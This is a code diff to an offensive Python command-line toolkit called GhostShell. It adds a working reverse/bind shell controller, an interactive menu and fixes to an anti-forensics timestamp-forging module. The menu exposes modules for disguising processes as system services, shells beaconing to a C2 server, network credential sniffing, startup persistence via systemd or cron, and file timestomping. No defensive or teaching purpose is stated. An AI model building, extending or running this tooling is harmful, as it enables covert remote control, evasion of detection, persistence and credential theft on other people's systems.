@@ -11,6 +11,7 @@ from rich.console import Console
 from rich.table import Table
 from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.panel import Panel
+from rich.prompt import Prompt
 import concurrent.futures
 import platform
 import struct
@@ -53,7 +54,10 @@ def execute_command(cmd):
             return str(e).encode()
 
     try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        # Added timeout to prevent hanging on interactive commands
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
+    except subprocess.TimeoutExpired:
+        output = b"Error: Command timed out (10s limit for non-interactive shells)"
     except subprocess.CalledProcessError as e:
         output = str(e.output).encode()
     except Exception as e:
@@ -276,6 +280,7 @@ def audit():
         console.print(table)
         console.print("\n[green]System appears safe from high-profile kernel exploits.[/green]")
 
+
 # --- MODULE 6: TIMESTOMPING (Anti-Forensics) ---
 
 @app.command()
@@ -295,6 +300,10 @@ def timestomp(
     """
     console.print(Panel(f"Target: {target}", title="Timestomper", style="bold purple"))
     
+    # Fix: Handle Typer Option object when called programmatically
+    if hasattr(date, "default"): # Simple check if it's a typer.OptionInfo object
+        date = None
+
     if not os.path.exists(target):
         console.print(f"[red]Error: Target file '{target}' not found.[/red]")
         return
@@ -345,6 +354,58 @@ def timestomp(
         
     except Exception as e:
         console.print(f"[red]Operation failed: {e}[/red]")
+
+# --- MODULE 9: CLIENT (Attacker Controller) ---
+
+@app.command()
+def client(
+    target: str = typer.Argument(..., help="Target IP"),
+    port: int = typer.Argument(..., help="Target Port"),
+    mode: str = typer.Option("connect", help="Mode: 'connect' (for Bind Shell) or 'listen' (for Reverse Shell)")
+):
+    """
+    [ATTACKER] Shell Controller.
+    
+    Connects to a Bind Shell or listens for a Reverse Shell.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    if mode == "listen":
+        console.print(f"[yellow]Listening on 0.0.0.0:{port} for incoming reverse shell...[/yellow]")
+        s.bind(("0.0.0.0", port))
+        s.listen(1)
+        conn, addr = s.accept()
+        console.print(f"[green]Connection received from {addr}![/green]")
+        s = conn # Use the established connection
+    else:
+        console.print(f"[yellow]Connecting to {target}:{port}...[/yellow]")
+        try:
+            s.connect((target, port))
+            console.print(f"[green]Connected![/green]")
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}[/red]")
+            return
+
+    # Simple Shell Loop
+    try:
+        while True:
+            # Receive data (non-blocking attempt or short timeout could be better, but blocking is standard for simple netcat)
+            data = s.recv(4096).decode(errors='ignore')
+            if not data:
+                break
+            print(data, end="") # Print prompt/output
+            
+            cmd = input() # Read user command
+            s.send(cmd.encode() + b"\n")
+            
+            if cmd.strip().lower() in ["exit", "quit"]:
+                break
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Closing connection...[/yellow]")
+    except Exception as e:
+        console.print(f"\n[red]Error: {e}[/red]")
+    finally:
+        s.close()
 
 # --- MODULE 7: RAW SOCKET SNIFFER (Network Eavesdropping) ---
 
@@ -565,6 +626,104 @@ def simulate_boot():
     except Exception:
         # Silently fail if no crontab exists (normal for fresh containers)
         pass
+
+@app.command()
+def menu():
+    """
+    [INTERACTIVE] Dashboard Mode.
+    
+    Launches an interactive menu to use GhostShell without memorizing commands.
+    """
+    while True:
+        console.clear()
+        console.print(Panel.fit("[bold cyan]GhostShell Interactive Interface[/bold cyan]", subtitle="Select a module"))
+        
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("ID", style="dim", width=4)
+        table.add_column("Module", style="bold")
+        table.add_column("Description")
+        
+        options = [
+            ("1", "Ghost", "Process Masquerading (Evasion)"),
+            ("2", "Bind Shell", "Listen for incoming connections (Persistence)"),
+            ("3", "Reverse Shell", "Connect to C2 server (Beaconing)"),
+            ("4", "Scanner", "Network Discovery (Recon)"),
+            ("5", "Audit", "Kernel Vulnerability Check"),
+            ("6", "Timestomp", "File Timestamp Manipulation"),
+            ("7", "Sniffer", "Network Credential Sniffer"),
+            ("8", "Persistence", "Install startup hook"),
+            ("9", "Client", "Attacker Controller (Connect/Listen)"),
+            ("0", "Exit", "Close GhostShell")
+        ]
+        
+        for opt in options:
+            table.add_row(*opt)
+            
+        console.print(table)
+        
+        choice = Prompt.ask("Select an option", choices=[opt[0] for opt in options], default="0")
+        
+        if choice == "0":
+            console.print("[yellow]Exiting...[/yellow]")
+            break
+            
+        try:
+            if choice == "1":
+                name = Prompt.ask("Process Name", default="kworker/u4:0")
+                ghost(name=name)
+            elif choice == "2":
+                port = int(Prompt.ask("Port", default="4444"))
+                name = Prompt.ask("Process Name", default="systemd-resolved")
+                listen(port=port, name=name)
+            elif choice == "3":
+                ip = Prompt.ask("Attacker IP")
+                port = int(Prompt.ask("Port", default="4444"))
+                name = Prompt.ask("Process Name", default="chrome-extension-helper")
+                connect(ip=ip, port=port, name=name)
+            elif choice == "4":
+                target = Prompt.ask("Target IP")
+                ports = Prompt.ask("Port Range", default="1-1000")
+                threads = int(Prompt.ask("Threads", default="50"))
+                scan(target=target, ports=ports, threads=threads)
+                Prompt.ask("\nPress Enter to return to menu...")
+            elif choice == "5":
+                audit()
+                Prompt.ask("\nPress Enter to return to menu...")
+            elif choice == "6":
+                target = Prompt.ask("Target File")
+                ref_file = Prompt.ask("Reference File", default="/bin/bash")
+                timestomp(target=target, ref_file=ref_file, date=None) # Explicitly pass None
+                Prompt.ask("\nPress Enter to return to menu...")
+            elif choice == "7":
+                interface = Prompt.ask("Interface", default="eth0")
+                sniff(interface=interface)
+            elif choice == "8":
+                method = Prompt.ask("Method", choices=["systemd", "cron"], default="systemd")
+                payload = Prompt.ask("Payload Command", default="listen --port 4444")
+                persist(method=method, payload=payload)
+                Prompt.ask("\nPress Enter to return to menu...")
+            elif choice == "9":
+                mode = Prompt.ask("Mode", choices=["connect", "listen"], default="connect")
+                if mode == "connect":
+                    target = Prompt.ask("Target IP", default="127.0.0.1")
+                    port = int(Prompt.ask("Port", default="4444"))
+                    client(target=target, port=port, mode="connect")
+                else:
+                    port = int(Prompt.ask("Local Port", default="4444"))
+                    client(target="0.0.0.0", port=port, mode="listen")
+                Prompt.ask("\nPress Enter to return to menu...")
+
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Operation cancelled by user.[/yellow]")
+            time.sleep(1)
+        except Exception as e:
+            console.print(f"\n[red]Error: {e}[/red]")
+            Prompt.ask("\nPress Enter to return to menu...")
+
+@app.callback(invoke_without_command=True)
+def main(ctx: typer.Context):
+    if ctx.invoked_subcommand is None:
+        menu()
 
 if __name__ == "__main__":
     app()
